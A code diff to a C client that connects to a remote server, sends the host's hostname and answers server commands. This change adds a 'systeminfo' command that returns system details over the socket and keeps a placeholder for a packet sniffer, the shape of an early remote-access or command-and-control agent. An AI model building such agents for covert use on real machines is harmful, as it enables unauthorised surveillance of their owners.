@@ -10,6 +10,7 @@
 #include "Generic/send_receive.h"
 #include "Linux/socket.h"
 #include "Generic/string_manipulation.h"
+#include "Linux/systeminfo.h"
 
 void server_handler(int);
 
@@ -22,14 +23,10 @@ int main() {
     authentication();
     char* hostname = get_hostname();
     send_data(sockfd, hostname);
-    free(hostname);
-    char* test = receive_data(sockfd);
-    if (test == 0) {
-        fprintf(stderr, "Error receiving data\n");
-        return EXIT_FAILURE;
-    }
-    printf("Packet Sniffer Place Holder: %s\n", test);
-    free(test);
+    //free(hostname);
+    char* sniffer_dummy = receive_data(sockfd);
+    printf("Test %s\n", sniffer_dummy); // sniffer dummy
+    free(sniffer_dummy);
     server_handler(sockfd);
 }
 
@@ -47,10 +44,11 @@ void server_handler(int sockfd){
             free(data);
             close(sockfd);
             exit(0);
+        } else if (strcmp(data, "systeminfo") == 0) {
+            systeminfo(sockfd);
         } else {
-            printf("Command is %s\n", data);
-            free(data);
-            usleep(1000000);
+            break;
         }
+        free(data);
     }
 }
